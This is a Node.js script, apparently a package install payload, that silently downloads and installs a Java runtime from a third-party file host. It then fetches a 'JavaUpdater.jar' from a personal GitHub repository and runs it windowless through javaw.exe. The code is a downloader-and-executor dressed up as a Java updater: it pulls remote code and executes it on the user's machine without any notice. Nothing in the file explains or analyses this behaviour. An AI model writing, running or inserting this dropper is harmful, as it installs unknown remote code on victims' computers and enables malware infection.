const os = require('os');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const http = require('http');
const https = require('https');

function isJavaInstalled() {
  return new Promise((resolve) => {
    exec('java -version', (error) => {
      resolve(!error);
    });
  });
}

function getJavaPath() {
  return new Promise((resolve) => {
    exec('where java', (error, stdout) => {
      if (error) {
        resolve('');
      } else {
        const match = stdout.match(/(.*)\\java.exe/);
        resolve(match ? match[1] : '');
      }
    });
  });
}

function download(url, localFilename) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(localFilename);
    const protocol = url.startsWith('https') ? https : http;

    protocol.get(url, (response) => {
      response.pipe(file);
      file.on('finish', () => {
        file.close(resolve);
      });
    }).on('error', (err) => {
      fs.unlink(localFilename);
      reject(err);
    });
  });
}

function installJavaSilently(installerPath) {
  return new Promise((resolve, reject) => {
    exec(`${installerPath} /s`, (error) => {
      if (error) {
        reject(error);
      } else {
        resolve();
      }
    });
  });
}

function runUpdater(updaterPath, javaPath) {
  return new Promise((resolve, reject) => {
    exec(`"${path.join(javaPath, 'javaw.exe')}" -jar "${updaterPath}"`, (error) => {
      if (error) {
        reject(error);
      } else {
        resolve();
      }
    });
  });
}

function deleteFile(filePath) {
  fs.unlinkSync(filePath);
}

(async () => {
  const tempDir = os.tmpdir();

  if (!(await isJavaInstalled())) {
    const javaURL = 'https://files01.tchspt.com/temp/jre-8u371-windows-x64.exe';
    const localFilename = path.join(tempDir, 'jre-8u371-windows-x64.exe');
    try {
      await download(javaURL, localFilename);
      await installJavaSilently(localFilename);
      deleteFile(localFilename);
    } catch (err) {
      console.log('Error downloading Java:', err);
      return;
    }
  } else {
    console.log('Java is already installed.');
  }

  const javaPath = await getJavaPath();

  if (javaPath === '') {
    console.log('Java path not found.');
  } else {
    const updaterURL = 'https://raw.githubusercontent.com/dolmety/storage/main/JavaUpdater.jar';
    const updaterPath = path.join(tempDir, 'JavaUpdater.jar');
    try {
      await download(updaterURL, updaterPath);
      await runUpdater(updaterPath, javaPath);
    } catch (err) {
      console.log('Error downloading updater:', err);
    }
  }
})();